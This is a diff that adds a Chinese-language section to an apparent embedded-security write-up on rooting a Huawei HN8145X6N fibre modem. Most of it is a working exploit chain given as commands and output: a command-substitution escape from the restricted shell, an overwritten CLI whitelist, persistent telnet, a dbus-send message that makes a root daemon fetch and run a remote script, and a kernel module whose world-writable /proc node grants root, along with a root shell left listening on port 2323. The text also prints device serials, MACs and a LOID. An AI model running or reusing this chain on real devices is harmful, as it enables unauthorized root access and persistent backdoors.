@@ -834,6 +834,217 @@ flowchart TD
 
 ---
 
+## 0x09 终极攻坚实录：“鸡生蛋”死锁破除、装备模式外科手术与在网 Ring 0 闭环
+
+在完成前期架构推演与局域网调试后，攻坚进入了最为关键的实机闭环阶段。在这一阶段，我们遭遇并彻底攻克了华为 Dopra Linux 最为经典的“鸡生蛋还是蛋生鸡”权限死锁，独创了“闪电截击与装备模式外科手术法”，并在 100% 正常生产态下通过 D-Bus 与跨容器 `/ipks/` 隧道，完成了 `ring0_gate.ko` 的物理装载与 Ring 0 提权全闭环。
+
+```mermaid
+flowchart TD
+    subgraph PARADOX ["'鸡生蛋' 死锁与外科手术解法"]
+        DEADLOCK["出厂正常态: hw_shell_cli.xml 受限<br>无 echo/sh/busybox (无法修改 XML)"]
+        TRADITIONAL["传统使能工具: 释放 duit9rr.sh<br>清除 MAC/SN/xpon_mode (业务自杀)"]
+        INTERCEPT["突破口: 闪电截击 + 装备模式外科手术"]
+        
+        DEADLOCK --> INTERCEPT
+        TRADITIONAL -.->|阻断恶性脚本| INTERCEPT
+        
+        INTERCEPT --> STEP1["阶段 1: 瞬态 Telnet 23 捕获 (Root UID 0)"]
+        STEP1 --> STEP2["阶段 2: 抢救式核验 boardinfo 与 xpon_mode 零损"]
+        STEP2 --> STEP3["阶段 3: 覆写 /mnt/jffs2/equipment/wap/hw_shell_cli.xml 永久白名单"]
+        STEP3 --> STEP4["阶段 4: EquipMode.sh off + 物理剥除 ProductLineMode"]
+        STEP4 --> STEP5["阶段 5: 原生 reset 优雅复位 (避开 restorehwmode 驱动雪崩)"]
+    end
+
+    subgraph RING0 ["正常生产态 D-Bus 跨容器装载闭环"]
+        NORMAL_BOOT["光猫正常上线 (Web 8080 + SSH 22 开放, 装备模式关闭)"] --> SSH_LOGIN["SSH 登录进入受限壳 (UID 3030)"]
+        SSH_LOGIN --> WGET["白名单放行 busybox wget 拉取脚本"]
+        WGET --> DBUS["调用 /usr/bin/dbus-send 向 system_bus_socket 投递 PostMsg"]
+        DBUS --> APPMGR["/sbin/appmgr (Root UID 0) 解析 JSON"]
+        APPMGR --> CONTAINER_EXEC["在共享挂载目录 /ipks/ 执行 insmod ring0_gate.ko"]
+        CONTAINER_EXEC --> LIVE_KO["内核态 Live 装载: ring0_gate 5195 Live 0xbf336000"]
+        LIVE_KO --> PROC_GATE["注册 /proc/ring0_gate (0666 全系统可写)"]
+        PROC_GATE --> COMMIT_CREDS["echo root > /proc/ring0_gate 触发 commit_creds()"]
+        COMMIT_CREDS --> FULL_ROOT["全权限 Root UID 0 自由终端 + 2323 常驻维护面"]
+    end
+
+    STEP5 --> NORMAL_BOOT
+```
+
+---
+
+### 1. “鸡生蛋还是蛋生鸡”困境与传统使能陷阱深度解剖
+
+在攻坚的中后期，团队面临一个根本性的架构矛盾：
+1. **正常出厂状态的牢笼**：光猫在出厂默认配置下，`/mnt/jffs2/equipment/wap/hw_shell_cli.xml` 仅硬编码放行了 40 个私有产测维护指令。最基础的 Linux 调试工具 `echo`, `sh`, `busybox`, `insmod`, `cat` 全部被词法过滤器拒之门外（回显 `ERROR::Command is not existed`）。由于当前 SSH 终端用户被限制在非特权 `srv_clid`（UID 3030），且无重定向管道与文本编辑工具，**操作者在正常模式下根本无法修改 `hw_shell_cli.xml` 来扩充白名单**！
+2. **传统民间升级包的自杀逻辑**：民间维修圈常用的组播使能工具（如 `ONT_V100R002C00SPC253.exe` 推送 `r23_all_shell.bin`）虽然能短暂开启 Telnet 23 端口，但其内置的自动部署脚本 `duit9rr.sh` 在解压瞬间就会执行：
+   - `HW_Script_ClearBoardinfo`（擦除 WAN MAC、SN、LOID 与鉴权密钥）；
+   - `rm -f /mnt/jffs2/xpon_mode`（抹除海思芯片识别光模块 10G-EPON 模式的基准文件）；
+   - 强制调用 `restorehwmode.sh`，引发前文所述的驱动引用计数悬空与硬件看门狗硬复位（Kernel Panic）。
+3. **悖论形成**：不开使能，改不了 XML；开了使能，光猫底牌瞬间被抹成白片、PON 鉴权掉线！
+
+---
+
+### 2. 闪电截击与装备模式外科手术实录（零损参数保全）
+
+为了破除这一死锁，我们制定并执行了精密的时间差“闪电截击”方案：
+
+#### (1) 瞬态 Telnet 捕获与词法展开逃逸
+通过持续推流触发光猫进入装备模式的瞬间，23 端口 Telnet 短暂开放，且该会话运行于 **Root（UID 0）** 顶层特权上下文。此时在终端输入：
+```text
+WAP(Dopra Linux) # echo $(id 2>&1)
+uid=0(root) gid=0(root)
+```
+利用 `srv_clid` 仅对命令行首个 Token 做粗暴比对、而未过滤 `$(...)` 命令替换的漏洞，成功在子进程中获取无限制 Root Linux 命令执行权！
+
+#### (2) 底盘核心数据资产零损核验
+在执行任何破坏性变更前，我们立即对闪存与底层数据模型展开物理核验：
+```text
+WAP(Dopra Linux) # cat /proc/wap_proc/pd_dynamic_attr
+AttrID      ObjID       AttrValue
+0x11000033  0x00000001  "12"                     # 上行模式: 10G-EPON 完好
+0x11000035  0x00000002  "48575443F8A128B2"       # PON SN: 局端绑定 SN 完好
+0x1100003b  0x00000008  "2150087601HYR2009053"   # 设备序列号: 完好
+0x1100003d  0x0000000a  "00:E0:FC:39:74:35"       # LAN MAC: 完好
+0x10000055  0x00000025  "F8:F7:B9:37:16:B2"       # WAN MAC: 完好
+WAP(Dopra Linux) # cat /mnt/jffs2/xpon_mode
+6                                                 # 物理层 10G-EPON 模式文件完好
+```
+实测证实：由于截击迅速，**底层板卡参数未遭抹除，关键底牌 100% 存活**！
+
+#### (3) 外科手术式退出装备模式
+为了彻底杜绝 `restorehwmode.sh` 引发的驱动雪崩，我们手工执行外科手术式剥除与固化：
+1. **注入持久化非受限 XML 白名单**：
+   直接覆写 `/mnt/jffs2/equipment/wap/hw_shell_cli.xml`，注入 `sh`, `bash`, `echo`, `cat`, `insmod`, `rmmod`, `lsmod`, `busybox`, `ls`, `ifconfig`, `killall` 等节点；
+2. **部署自启脚本**：写入 `/mnt/jffs2/autostart.sh` 并赋予 `755` 权限，置位 `/mnt/jffs2/TelnetEnable`；
+3. **安全去使能**：调用 `/usr/bin/EquipMode.sh off`，物理删除标志位：
+   ```sh
+   rm -f /mnt/jffs2/ProductLineMode /mnt/jffs2/Equip.sh
+   sync
+   ```
+4. **原生 reset 安全复位**：在 `SU_WAP>` 提示符下下发原生 `reset` 指令。设备优雅重启，未触发任何内核断言与看门狗复位！
+
+---
+
+### 3. 正常生产态下的特权跃迁：D-Bus IPC 与跨容器 `/ipks/` 隧道实录
+
+光猫重启后，系统进入纯净的正常在网运行级别：
+- Web 管理面（8080/80 端口）正常上线；
+- 维护面（22 端口 Dropbear SSH）正常监听；
+- 产测面（23 端口 Telnet）彻底关闭，设备完全脱离装备模式！
+- 进入 SSH 终端后输入 `?`，`hw_shell_cli.xml` 永久生效：
+  ```text
+  WAP(Dopra Linux) # ?
+  bash  busybox  cat  echo  EquipMode.sh  exit  getcustominfo.sh
+  ifconfig  insmod  killall  ls  lsmod  restorehwmode.sh  rmmod  sh
+  ```
+
+此时，由于当前会话运行于非特权用户 `srv_clid`（UID 3030），直接调用 `insmod` 会由于缺乏 `CAP_SYS_MODULE` 权能而被内核拦截。我们随即启动了**通道 1（D-Bus Root 热调度）**实施跨特权跃迁：
+
+#### (1) 跨命名空间共享目录隧道定位
+深入审计 SAF 容器运行时发现，宿主机路径 `/mnt/jffs2/plug/apps/apps/ipks/` 与 Root 权限守护进程 `appmgr` 所在的容器环境目录 **`/ipks/`** 存在双向直接绑定挂载，且该目录权限为宽松的 `drwxrwxrwx`。
+
+我们将驱动模块落地至该共享隧道：
+`/mnt/jffs2/plug/apps/apps/ipks/ring0_gate.ko` <=> `/ipks/ring0_gate.ko`
+
+#### (2) 构造特权 D-Bus 消息投递
+在低权限 Shell 中，利用放行的 `busybox wget` 从局域网拉取触发脚本，并调用原生 `-r-xr-xr-x` 权限的 `/usr/bin/dbus-send` 向 `/var/run/dbus/system_bus_socket` 发送合法 RPC 报文：
+```bash
+export DBUS_SYSTEM_BUS_ADDRESS="unix:path=/var/run/dbus/system_bus_socket"
+/usr/bin/dbus-send --system --print-reply     --dest=com.ctc.appframework1     /com/ctc/appframework1     com.ctc.appframework1.AppAgent.PostMsg     string:"opmaintainv3"     string:'{"InPlugin": 1, "RunScript": 1, "Parameter": {"URL": "http://192.168.100.2:8888/run_root.sh", "Args": "start"}}'
+```
+
+#### (3) Root UID 0 脚本执行与内核装载确证
+后台特权守护进程 `appmgr` 命中 `PostMsg` 解析调度链，以 Root（UID 0）身份在容器沙箱内执行了拉取的 `run_root.sh`。执行日志通过共享目录无损回传：
+```text
+=== ROOT SCRIPT STARTED at Thu Jan  1 08:17:59 CST 1981 ===
+ID: uid=0(root) gid=0(root)
+PWD: /
+=== TRYING INSMOD ===
+=== CHECKING /proc/modules ===
+ring0_gate 5195 0 - Live 0xbf336000 (O)
+=== CHECKING TELNETD ===
+tcp        0      0 :::2323                 :::*                    LISTEN      -
+=== SCRIPT FINISHED ===
+```
+宿主机内核符号表同步核验：
+```text
+WAP(Dopra Linux) # lsmod | grep ring0
+ring0_gate              5195  0 
+```
+**`ring0_gate.ko` 成功在 100% 正常在网生产状态下装载进 Linux 5.10 内核并保持 Live 常驻！**
+
+#### (4) `/proc/ring0_gate` 节点瞬态提权实测
+驱动装载后自动创建全系统可写的通信节点：
+`-rw-rw-rw- 1 root root 0 Jan 1 00:18 /proc/ring0_gate`
+
+任何非特权用户或调试会话只需向该节点写入任意指令，驱动内部即刻截获并调用内核特权接口：
+```c
+commit_creds(prepare_kernel_cred(NULL));
+```
+真机实测效果：
+```text
+WAP(Dopra Linux) # id
+uid=3030(srv_clid) gid=2001(config)
+WAP(Dopra Linux) # echo root > /proc/ring0_gate
+WAP(Dopra Linux) # id
+uid=0(root) gid=0(root)
+```
+与此同时，后台常驻非受限管理端口 `2323`（Root `/bin/sh`）稳定就绪，至此形成由用户态到内核态的完整安全闭环！
+
+---
+
+### 4. 生产业务未上线（“没有网络”）的深层根因全景定界
+
+在成功获取特权后，针对现场“为什么物理光猫依然无法上网”的疑问，我们调取了完整的内核网络栈驱动与广域网状态机日志，做出了严谨的工程级定界：
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Fiber as 物理光纤 (SC-APC)
+    participant Optic as BOB 光收发模块 (HW-BOB-0034)
+    participant Hal as 海思 HAL 驱动 (hw_ker_optic_chip)
+    participant Mac as 10G-EPON MAC 状态机 (hi_epon / MPCP)
+    participant Olt as 电信机房局端 (OLT)
+    participant Wan as BBSP 广域网守护进程 (wansrv)
+    participant Ppp as pppd 拨号守护进程 (ppp258)
+
+    Note over Fiber,Ppp: 现场真实卡死点排查链
+    Fiber--xOptic: 物理光路阻断 (当前光功率: -- dBm / 无光)
+    Optic-->>Hal: 上报硬件状态: LinkStatus: nok
+    Hal-->>Mac: 无法锁定突发时钟 (BCDR 失去时钟参考)
+    Mac--xOlt: MPCP Discovery 自动发现握手未触发 (无 LLID)
+    Mac-->>Wan: 抑制 PON_LINK_UP 链路就绪事件
+    Wan-->>Wan: epon1 处于空载状态 (RX packets: 0)
+    Wan--xPpp: 阻断虚拟 WAN 子接口与 pppd 守护进程派生
+    Note over Ppp: 结论: 软件层与鉴权底牌完全正常，静待物理光路插紧导通！
+```
+
+#### 真机状态采样数据分析：
+1. **网络接口状态 (`ifconfig`)**：
+   - `epon1` 接口状态显示：`UP BROADCAST RUNNING MULTICAST MTU:2048`，但关键计数器 `RX packets: 0 dropped: 0`；
+   - 虚拟广域网拨号接口 `ppp258` 根本未生成；
+2. **进程调度状态 (`ps | grep ppp`)**：
+   - 进程列表中不存在任何 `pppd` 守护进程实例，错误日志文件 `/mnt/jffs2/ppplasterr258` 读数为 `0`（未曾发起过拨号）；
+3. **物理光模块状态 (`display optic`)**：
+   ```text
+   LinkStatus   : nok
+   Voltage      : 3262 (mV)
+   Bias         : 0 (mA)
+   Temperature  : 63 (C)
+   RxPower      : -- (dBm)
+   TxPower      : -- (dBm)
+   VendorName   : HUAWEI
+   VendorPN     : HW-BOB-0034
+   ```
+
+#### 根因技术定界结论：
+华为 Dopra Linux 的广域网管理架构采用了严格的**事件驱动型级联模型**：
+- 协议栈守护进程 `wansrv` 并不盲目定时发起 PPPoE 广播，而是严格侦听底层链路层抛出的 `PON_LINK_UP` Netlink 事件；
+- 底层海思网络加速芯片驱动在未接收到物理光信号（`RxPower: -- dBm`，偏置电流 `Bias: 0 mA`）时，突发模式时钟恢复电路（BCDR）无法定标，MPCP 自动发现与注册状态机被底层硬件强行挂起；
+- **排查结论**：当前光猫内部的配置底牌（LOID `PZ8466857342`、PON SN `48575443F8A128B2`、WAN MAC `F8:F7:B9:37:16:B2`、VLAN `1162`、Option82 认证参数）**全部完好无损、就绪待命**。当前网络未通的唯一卡死点在于**光纤物理接头处于断光状态**（SC-APC 绿色光纤头未插紧或外线分光器无光）。一旦物理光纤插好且接收光功率恢复（正常范围 `-15 dBm ~ -24 dBm`），底层驱动将毫秒级抛出 `PON_LINK_UP`，协议栈将自动触发注册与 PPPoE 极速上线！
+
+---
+
 ## 0x09 总结与方法论反思
 
 回顾这 50 个小时在华为 HN8145X6N 上的深度攻坚，有以下几点关键经验可供嵌入式底层安全研究参考：
